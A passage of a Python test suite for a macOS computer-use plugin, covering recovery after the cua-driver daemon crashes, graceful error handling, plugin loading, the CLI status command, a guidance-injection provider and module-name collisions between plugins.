        finally:
            bridge.stop()

    def test_bridge_stop_is_idempotent_and_clears_state(self):
        bridge = cua_backend_mod._AsyncBridge()
        bridge.start()
        bridge.stop()
        assert bridge._thread is None and bridge._loop is None
        bridge.stop()  # second stop must not raise
        assert bridge._thread is None

    def test_bridge_stop_without_start_does_not_raise(self):
        cua_backend_mod._AsyncBridge().stop()  # must be a clean no-op

    def test_run_on_unstarted_bridge_raises_clean_runtimeerror(self):
        bridge = cua_backend_mod._AsyncBridge()

        async def _noop():
            return 1

        coro = _noop()
        try:
            with pytest.raises(RuntimeError, match="not started"):
                bridge.run(coro)
        finally:
            coro.close()  # bridge rejected before awaiting — close cleanly

    def test_session_stop_without_start_is_noop(self):
        bridge = cua_backend_mod._AsyncBridge()
        session = cua_backend_mod._CuaDriverSession(bridge)
        session.stop()  # not started — must not raise or touch the bridge
        assert session._started is False

    def test_backend_stop_is_idempotent(self):
        """CuaDriverBackend.stop() must be safe to call twice / before start."""
        b = cua_backend_mod.CuaDriverBackend()
        b.stop()  # never started
        b.stop()  # twice


class TestDaemonCrashRecovery:
    """cua-driver 0.1.9's keyboard/scroll tools can crash its relay daemon
    (a SkyLight SPI defect). Verified live: after a ``press_key`` crash the
    daemon dies and the bound ``cua-driver mcp`` relay returns
    "daemon closed connection"/"daemon not reachable" for EVERY subsequent
    call — the session is permanently wedged unless recycled. A fresh
    session spawns a new relay which relaunches the daemon. These tests
    pin the recover-once-and-retry behaviour and the clean-degradation of
    the read paths. Mock payloads are the live 0.1.9 error strings."""

    # Live-captured 0.1.9 transport-error message after a press_key crash.
    _DEAD_MSG = ("Internal error: daemon transport: daemon closed "
                 "connection before responding")
    # Live-captured 0.1.9 message on the FOLLOWING call (daemon gone).
    _UNREACHABLE_MSG = (
        "Internal error: cua-driver daemon not reachable on "
        "/Users/x/Library/Caches/cua-driver/cua-driver.sock. Start it "
        "with `open -n -g -a CuaDriver --args serve` and retry."
    )

    def test_is_dead_daemon_error_matches_live_strings(self):
        """The two live 0.1.9 crash strings must be recognised; an ordinary
        tool error message must NOT be (tool errors come back as isError,
        never as an exception, but the discriminator must still be tight)."""
        f = cua_backend_mod._is_dead_daemon_error
        assert f(RuntimeError(self._DEAD_MSG)) is True
        assert f(RuntimeError(self._UNREACHABLE_MSG)) is True
        assert f(RuntimeError("AX action AXPress failed with code -25206")) is False
        assert f(RuntimeError("element_index 7 out of range")) is False

    def test_is_dead_daemon_error_matches_anyio_stream_errors(self):
        """Audit loop 9, found live: killing the cua-driver relay daemon
        mid-workflow makes the mcp SDK's anyio stdio stream raise
        ``ClosedResourceError`` / ``BrokenResourceError`` / ``EndOfStream``.
        These stringify to "" — a message-substring match alone NEVER fires,
        so the session-recovery path was silently skipped and the session
        wedged permanently. ``_is_dead_daemon_error`` must recognise them by
        exception *type name*, including when wrapped by the mcp SDK."""
        from anyio import BrokenResourceError, ClosedResourceError, EndOfStream
        f = cua_backend_mod._is_dead_daemon_error
        # The anyio errors stringify to "" — the type-name arm must catch them.
        assert str(ClosedResourceError()) == ""
        assert f(ClosedResourceError()) is True
        assert f(BrokenResourceError()) is True
        assert f(EndOfStream()) is True
        assert f(BrokenPipeError()) is True
        assert f(ConnectionResetError()) is True
        # Wrapped several links deep (the mcp SDK chains the raw anyio error)
        # — the __cause__ / __context__ walk must still find it.
        wrapped = RuntimeError("send failed")
        wrapped.__cause__ = ClosedResourceError()
        assert f(wrapped) is True
        deep = RuntimeError("outer")
        mid = RuntimeError("mid")
        mid.__context__ = BrokenResourceError()
        deep.__cause__ = mid
        assert f(deep) is True
        # An ordinary tool error still must NOT match — discriminator stays tight.
        assert f(RuntimeError("element_index 7 out of range")) is False
        # A self-referential cause chain must terminate, not loop forever.
        loop_exc = RuntimeError("loop")
        loop_exc.__cause__ = loop_exc
        assert f(loop_exc) is False

    def test_session_call_tool_recovers_once_after_dead_daemon(self):
        """``_CuaDriverSession.call_tool`` must recycle the session and
        retry exactly once when the first attempt hits a dead daemon."""

        class _FakeBridge:
            def __init__(self):
                self.attempts = 0

            def start(self):
                ...

            def run(self, coro, timeout=30.0):
                if hasattr(coro, "close"):
                    coro.close()  # never actually awaited in the fake
                self.attempts += 1
                if self.attempts == 1:
                    raise RuntimeError(
                        "Internal error: daemon transport: daemon closed "
                        "connection before responding")
                return {"data": {"message": "ok"}, "images": [],
                        "structuredContent": None, "isError": False}

        bridge = _FakeBridge()
        session = cua_backend_mod._CuaDriverSession(bridge)
        session._started = True
        # Stub the actual session recycle — the recover path itself is
        # exercised live in the audit; here we pin the retry-once contract.
        recovered = []
        session._recover = lambda: recovered.append(True)  # type: ignore

        out = session.call_tool("press_key", {"pid": 1, "key": "return"})
        assert out["isError"] is False
        assert out["data"]["message"] == "ok"
        assert recovered == [True]  # recovered exactly once
        assert bridge.attempts == 2  # original + one retry

    def test_session_call_tool_propagates_non_dead_error(self):
        """A non-transport exception must NOT trigger recovery — it
        propagates so the caller can surface it as a clean failure."""

        class _FakeBridge:
            def __init__(self):
                self.attempts = 0

            def start(self):
                ...

            def run(self, coro, timeout=30.0):
                if hasattr(coro, "close"):
                    coro.close()
                self.attempts += 1
                raise RuntimeError("element_index 99 out of range")

        bridge = _FakeBridge()
        session = cua_backend_mod._CuaDriverSession(bridge)
        session._started = True
        with pytest.raises(RuntimeError, match="out of range"):
            session.call_tool("click", {"pid": 1, "element_index": 99})
        assert bridge.attempts == 1  # no retry — not a dead-daemon error

    def test_call_wraps_transport_error_in_typed_exception(self):
        """``CuaDriverBackend._call`` wraps any escaping ``call_tool``
        exception in a typed ``CuaDriverCallError``."""

        class _RaisingSession:
            def call_tool(self, name, args, timeout=30.0):
                raise RuntimeError(
                    "Internal error: daemon transport: daemon closed "
                    "connection before responding")

        b = cua_backend_mod.CuaDriverBackend()
        b._session = _RaisingSession()
        with pytest.raises(cua_backend_mod.CuaDriverCallError):
            b._call("list_windows", {"on_screen_only": True})

    def test_call_error_never_stringifies_to_empty(self):
        """Audit loop 9, found live: an anyio ``ClosedResourceError`` (raised
        when the relay daemon is killed) stringifies to "" — so a naive
        ``f"...: {e}"`` left the wrapped error message as "cua-driver X
        failed: " with nothing after the colon, unactionable for the model.
        ``_call`` must fall back to ``repr`` so the message always names the
        failure."""
        from anyio import ClosedResourceError

        class _EmptyRaisingSession:
            def call_tool(self, name, args, timeout=30.0):
                raise ClosedResourceError()  # str() == ""

        b = cua_backend_mod.CuaDriverBackend()
        b._session = _EmptyRaisingSession()
        with pytest.raises(cua_backend_mod.CuaDriverCallError) as ei:
            b._call("list_windows", {"on_screen_only": True})
        msg = str(ei.value)
        assert msg.strip() != "cua-driver list_windows failed:"
        assert "ClosedResourceError" in msg  # repr fallback carries the type

    def test_action_message_never_empty_on_empty_exception(self):
        """The ``_action`` error path mirrors ``_call`` — an empty-string
        exception must still produce a non-empty ActionResult.message."""
        from anyio import BrokenResourceError

        class _EmptyRaisingSession:
            def call_tool(self, name, args, timeout=30.0):
                raise BrokenResourceError()

        b = cua_backend_mod.CuaDriverBackend()
        b._session = _EmptyRaisingSession()
        b._active_pid = 4242
        res = b.type_text("hello")
        assert res.ok is False
        assert res.message.strip() not in ("", "cua-driver error:")
        assert "BrokenResourceError" in res.message

    def test_session_recovers_from_empty_string_anyio_crash(self):
        """The live loop-9 scenario end to end: a ``ClosedResourceError``
        (the daemon was killed) must be recognised as a dead daemon and
        trigger the recover-and-retry, even though it stringifies to ""."""
        from anyio import ClosedResourceError

        class _FakeBridge:
            def __init__(self):
                self.attempts = 0

            def start(self):
                ...

            def run(self, coro, timeout=30.0):
                if hasattr(coro, "close"):
                    coro.close()
                self.attempts += 1
                if self.attempts == 1:
                    raise ClosedResourceError()  # daemon killed; str() == ""
                return {"data": {"message": "ok"}, "images": [],
                        "structuredContent": None, "isError": False}

        bridge = _FakeBridge()
        session = cua_backend_mod._CuaDriverSession(bridge)
        session._started = True
        recovered = []
        session._recover = lambda: recovered.append(True)  # type: ignore
        out = session.call_tool("get_window_state", {"pid": 1, "window_id": 2})
        assert out["isError"] is False
        assert recovered == [True]   # the anyio error WAS recognised
        assert bridge.attempts == 2  # original + one retry

    def test_capture_degrades_cleanly_when_daemon_unrecoverable(self):
        """A capture whose ``list_windows`` call raises an unrecoverable
        transport error must return a ``CaptureResult`` with ``error`` set
        — NOT let a raw ``McpError`` escape the method."""

        class _RaisingSession:
            def call_tool(self, name, args, timeout=30.0):
                raise RuntimeError(
                    "Internal error: cua-driver daemon not reachable")

        b = cua_backend_mod.CuaDriverBackend()
        b._session = _RaisingSession()
        res = b.capture(mode="som", app="TextEdit")
        assert res.error  # surfaced, not raised
        assert "cua-driver" in res.error.lower()
        assert res.elements == [] and res.png_b64 is None

    def test_action_degrades_cleanly_when_daemon_unrecoverable(self):
        """An action whose tool call raises must return a failed
        ``ActionResult`` — never propagate the raw exception."""

        class _RaisingSession:
            def call_tool(self, name, args, timeout=30.0):
                raise RuntimeError(
                    "Internal error: daemon transport: daemon closed "
                    "connection before responding")

        b = cua_backend_mod.CuaDriverBackend()
        b._session = _RaisingSession()
        b._active_pid = 4242
        res = b.type_text("x")
        assert res.ok is False
        assert "cua-driver error" in res.message

    def test_list_apps_degrades_to_empty_when_daemon_unrecoverable(self):
        """``list_apps`` must degrade to ``[]`` on an unrecoverable
        transport error rather than raising out of the method."""

        class _RaisingSession:
            def call_tool(self, name, args, timeout=30.0):
                raise RuntimeError("Internal error: connection closed")

        b = cua_backend_mod.CuaDriverBackend()
        b._session = _RaisingSession()
        assert b.list_apps() == []

    def test_focus_app_degrades_cleanly_when_daemon_unrecoverable(self):
        """``focus_app`` must return a failed ``ActionResult`` on an
        unrecoverable transport error, not propagate the raw exception."""

        class _RaisingSession:
            def call_tool(self, name, args, timeout=30.0):
                raise RuntimeError("Internal error: broken pipe")

        b = cua_backend_mod.CuaDriverBackend()
        b._session = _RaisingSession()
        res = b.focus_app("TextEdit")
        assert res.ok is False
        assert "cua-driver" in res.message.lower()


class TestDeadCodeRemoved:
    """Regression guards for the audit's dead-code removal."""

    def test_no_parse_element_json_helper(self):
        """0.1.9 never emits per-element JSON — the _parse_element helper
        was dead and must stay removed."""
        assert not hasattr(cua_backend_mod, "_parse_element")

    def test_no_arm_mac_helper(self):
        """_is_arm_mac was never referenced — must stay removed."""
        assert not hasattr(cua_backend_mod, "_is_arm_mac")


# ---------------------------------------------------------------------------
# Plugin registration via the real OC loader
# ---------------------------------------------------------------------------

class TestPluginRegistration:
    def test_plugin_loads_and_registers_through_loader(self):
        from opencomputer.plugins.discovery import discover
        from opencomputer.plugins.loader import PluginAPI, load_plugin

        repo_root = Path(__file__).resolve().parent.parent.parent
        candidates = discover([repo_root / "extensions"], force_rescan=True)
        candidate = next(
            (c for c in candidates if c.manifest.id == "computer-use"), None
        )
        assert candidate is not None, "computer-use not discovered"
        assert candidate.manifest.kind == "tool"
        assert candidate.manifest.enabled_by_default is False

        class _ToolReg:
            def __init__(self): self.registered = []
            def register(self, t): self.registered.append(t)
            register_tool = register
            def names(self): return [t.schema.name for t in self.registered]

        class _HookEng:
            def __init__(self):
                self.specs = []
                self._hooks = {}
            def register(self, s):
                self.specs.append(s)
                self._hooks.setdefault(s.event, []).append(s)
            register_hook = register

        api = PluginAPI(
            tool_registry=_ToolReg(),
            hook_engine=_HookEng(),
            provider_registry={},
            channel_registry={},
        )
        loaded = load_plugin(candidate, api)
        assert loaded is not None
        # On macOS the tool registers; off macOS it is correctly withheld.
        names = api.tools.names()  # type: ignore[attr-defined]
        if sys.platform == "darwin":
            assert "computer_use" in names
        else:
            assert "computer_use" not in names

    def test_plugin_registers_injection_provider_on_macos(self):
        """The guidance injection provider registers alongside the tool."""
        from opencomputer.plugins.discovery import discover
        from opencomputer.plugins.loader import PluginAPI, load_plugin

        repo_root = Path(__file__).resolve().parent.parent.parent
        candidates = discover([repo_root / "extensions"], force_rescan=True)
        candidate = next(
            (c for c in candidates if c.manifest.id == "computer-use"), None
        )
        assert candidate is not None

        class _ToolReg:
            def __init__(self): self.registered = []
            def register(self, t): self.registered.append(t)
            register_tool = register

        class _HookEng:
            def __init__(self):
                self.specs = []
                self._hooks = {}
            def register(self, s):
                self.specs.append(s)
                self._hooks.setdefault(s.event, []).append(s)
            register_hook = register

        class _InjectionEng:
            def __init__(self): self.providers = []
            def register(self, p): self.providers.append(p)

        injection = _InjectionEng()
        api = PluginAPI(
            tool_registry=_ToolReg(),
            hook_engine=_HookEng(),
            provider_registry={},
            channel_registry={},
            injection_engine=injection,
        )
        loaded = load_plugin(candidate, api)
        assert loaded is not None

        ids = [p.provider_id for p in injection.providers]
        if sys.platform == "darwin":
            assert "computer-use:guidance" in ids
        else:
            # Off macOS the tool — and its guidance provider — are withheld.
            assert "computer-use:guidance" not in ids

    def test_plugin_ships_macos_computer_use_skill(self):
        """The plugin tree ships the macos-computer-use teaching skill."""
        skill_md = (
            PLUGIN_DIR / "skills" / "macos-computer-use" / "SKILL.md"
        )
        assert skill_md.is_file(), "macos-computer-use SKILL.md missing"
        text = skill_md.read_text(encoding="utf-8")
        assert text.startswith("---\n"), "skill must have YAML frontmatter"
        # Minimal OC frontmatter — name + description only.
        assert "name: macos-computer-use" in text
        assert "description:" in text
        # OC-adapted tool names — no hermes-isms left behind.
        assert "oc computer-use install" in text
        assert "hermes tools" not in text
        assert "read_file" not in text and "write_file" not in text
        assert "browser_" not in text
        # MEDIA: screenshot-delivery guidance is retained.
        assert "MEDIA:" in text


# ---------------------------------------------------------------------------
# `oc computer-use` CLI verbs
# ---------------------------------------------------------------------------

class TestComputerUseCli:
    @pytest.fixture()
    def cli_mod(self):
        return _load("_cu_test_cli", PLUGIN_DIR / "cu_cli.py")

    def test_status_resolves_via_find_cua_driver_not_just_path(self, cli_mod):
        """``status`` must resolve the binary via ``find_cua_driver`` — so it
        stays accurate when cua-driver is reachable only via the upstream
        installer's ``~/.local/bin`` symlink, not yet on ``$PATH``. A bare
        ``shutil.which`` would falsely report NOT installed there."""
        from typer.testing import CliRunner

        runner = CliRunner()
        with patch.object(cli_mod.platform, "system", return_value="Darwin"), \
             patch.object(cli_mod, "find_cua_driver",
                          return_value="/Users/x/.local/bin/cua-driver"), \
             patch.object(cli_mod, "cua_driver_version", return_value="0.1.9"):
            result = runner.invoke(cli_mod.app, ["status"])
        assert result.exit_code == 0
        assert "/Users/x/.local/bin/cua-driver" in result.stdout
        assert "0.1.9" in result.stdout

    def test_status_reports_not_installed_when_unresolvable(self, cli_mod):
        from typer.testing import CliRunner

        runner = CliRunner()
        with patch.object(cli_mod.platform, "system", return_value="Darwin"), \
             patch.object(cli_mod, "find_cua_driver", return_value=None):
            result = runner.invoke(cli_mod.app, ["status"])
        assert result.exit_code == 1
        assert "NOT installed" in result.stdout


# ---------------------------------------------------------------------------
# System-prompt guidance injection provider
# ---------------------------------------------------------------------------

class TestGuidanceInjectionProvider:
    @pytest.fixture()
    def provider(self):
        injection_mod = _load(
            "_cu_test_injection", PLUGIN_DIR / "cu_injection.py"
        )
        return injection_mod.ComputerUseGuidanceProvider()

    def _ctx(self):
        from plugin_sdk.injection import InjectionContext
        from plugin_sdk.runtime_context import RuntimeContext

        return InjectionContext(
            messages=(),
            runtime=RuntimeContext(),
            session_id="s1",
            turn_index=1,
        )

    def test_provider_id_is_stable(self, provider):
        assert provider.provider_id == "computer-use:guidance"

    def test_collect_returns_guidance_on_macos(self, provider):
        with patch("sys.platform", "darwin"):
            out = asyncio.run(provider.collect(self._ctx()))
        assert out is not None
        assert "Computer Use (macOS background control)" in out
        assert "computer_use" in out
        # Safety rules ported verbatim.
        assert "prompt injection" in out
        assert "secrets" in out

    def test_collect_returns_none_off_macos(self, provider):
        with patch("sys.platform", "linux"):
            out = asyncio.run(provider.collect(self._ctx()))
        assert out is None

    def test_collect_returns_none_on_windows(self, provider):
        with patch("sys.platform", "win32"):
            out = asyncio.run(provider.collect(self._ctx()))
        assert out is None


# ---------------------------------------------------------------------------
# sys.modules collision regression — computer-use loaded alongside the
# plugins it used to collide with (memory-vector / memory-wiki ship
# `backend.py`, browser-control ships `schema.py`, open-design ships
# `cli.py` + `doctor.py`). Before the cu_-prefix rename, whichever plugin
# loaded first won the bare name in sys.modules and the others (or
# computer-use) hit `ImportError: cannot import name ... from 'backend'`.
# This test loads them through the REAL loader in BOTH orders.
# ---------------------------------------------------------------------------

from opencomputer.plugins.discovery import discover  # noqa: E402
from opencomputer.plugins.loader import (  # noqa: E402
    PluginAPI,
    load_plugin,
)

_EXTENSIONS_DIR = PLUGIN_DIR.parent
_COLLIDING_IDS = ("memory-vector", "memory-wiki", "browser-control", "open-design")


class _CollisionToolReg:
    """Tool registry stub exposing the surface the loader contract reads."""

    def __init__(self) -> None:
        self.registered: list[object] = []

    def register(self, tool: object) -> None:
        self.registered.append(tool)

    register_tool = register

    def names(self) -> list[str]:
        return [t.schema.name for t in self.registered]  # type: ignore[attr-defined]


class _CollisionHookEngine:
    def __init__(self) -> None:
        self.specs: list[object] = []
        self._hooks: dict[object, list[object]] = {}

    def register(self, spec: object) -> None:
        self.specs.append(spec)
        self._hooks.setdefault(spec.event, []).append(spec)  # type: ignore[attr-defined]

    register_hook = register


def _fresh_api() -> PluginAPI:
    return PluginAPI(
        tool_registry=_CollisionToolReg(),
        hook_engine=_CollisionHookEngine(),
        provider_registry={},
        channel_registry={},
    )


def _candidates_by_id() -> dict[str, object]:
    cands = discover([_EXTENSIONS_DIR], force_rescan=True)
    return {c.manifest.id: c for c in cands}  # type: ignore[attr-defined]


class TestNoModuleCollisionWithSiblingPlugins:
    """The cu_-prefix rename must make computer-use immune to the
    `sys.modules` filename collision with sibling plugins."""

    def test_no_module_collision_with_sibling_plugins(self) -> None:
        by_id = _candidates_by_id()
        for pid in (*_COLLIDING_IDS, "computer-use"):
            assert pid in by_id, (
                f"{pid!r} not discovered in {_EXTENSIONS_DIR} — "
                f"got {sorted(by_id)!r}"
            )

        # ── Order A: colliding plugins FIRST, computer-use LAST. ──────
        # (worst case for computer-use — `backend` / `schema` / `cli` /
        # `doctor` already cached under the bare name by another plugin.)
        order_a = (*_COLLIDING_IDS, "computer-use")
        registered_a: dict[str, list[str]] = {}
        for pid in order_a:
            api = _fresh_api()
            loaded = load_plugin(by_id[pid], api)
            assert loaded is not None, (
                f"[order A] load_plugin({pid!r}) returned None — "
                "import-time failure; see logs"
            )
            registered_a[pid] = api.tools.names()  # type: ignore[attr-defined]
        assert "computer_use" in registered_a["computer-use"], (
            "[order A] computer_use tool did NOT register when loaded "
            f"after the colliding plugins — got {registered_a['computer-use']!r}"
        )
        # The memory plugins must still expose their own tools (their
        # `backend.py` import of VectorMemoryBackend must not have been
        # poisoned by computer-use).
        assert "VectorMemoryAdd" in registered_a["memory-vector"], (
            "[order A] memory-vector lost its tools — backend.py collision"
        )
        assert "WikiMemoryAdd" in registered_a["memory-wiki"], (
            "[order A] memory-wiki lost its tools — backend.py collision"
        )

        # ── Order B: computer-use FIRST, colliding plugins LAST. ──────
        order_b = ("computer-use", *_COLLIDING_IDS)
        registered_b: dict[str, list[str]] = {}
        for pid in order_b:
            api = _fresh_api()
            loaded = load_plugin(by_id[pid], api)
            assert loaded is not None, (
                f"[order B] load_plugin({pid!r}) returned None — "
                "import-time failure; see logs"
            )
            registered_b[pid] = api.tools.names()  # type: ignore[attr-defined]
        assert "computer_use" in registered_b["computer-use"], (
            "[order B] computer_use tool did NOT register when loaded "
            f"before the colliding plugins — got {registered_b['computer-use']!r}"
        )
        assert "VectorMemoryAdd" in registered_b["memory-vector"], (
            "[order B] memory-vector lost its tools after computer-use loaded"
        )
        assert "WikiMemoryAdd" in registered_b["memory-wiki"], (
            "[order B] memory-wiki lost its tools after computer-use loaded"
        )

    def test_memory_backends_import_their_own_class(self) -> None:
        """Direct proof of the original log: `cannot import name
        'VectorMemoryBackend' from 'backend'`. Load computer-use, THEN
        import each memory plugin's backend — the symbol must resolve."""
        by_id = _candidates_by_id()
        load_plugin(by_id["computer-use"], _fresh_api())

        for pid, symbol in (
            ("memory-vector", "VectorMemoryBackend"),
            ("memory-wiki", "WikiMemoryBackend"),
        ):
            mod = _load(
                f"_cu_collision_{pid.replace('-', '_')}_backend",
                _EXTENSIONS_DIR / pid / "backend.py",
            )
            assert hasattr(mod, symbol), (
                f"{pid}/backend.py is missing {symbol!r} after computer-use "
                "loaded — the sys.modules collision regressed"
            )
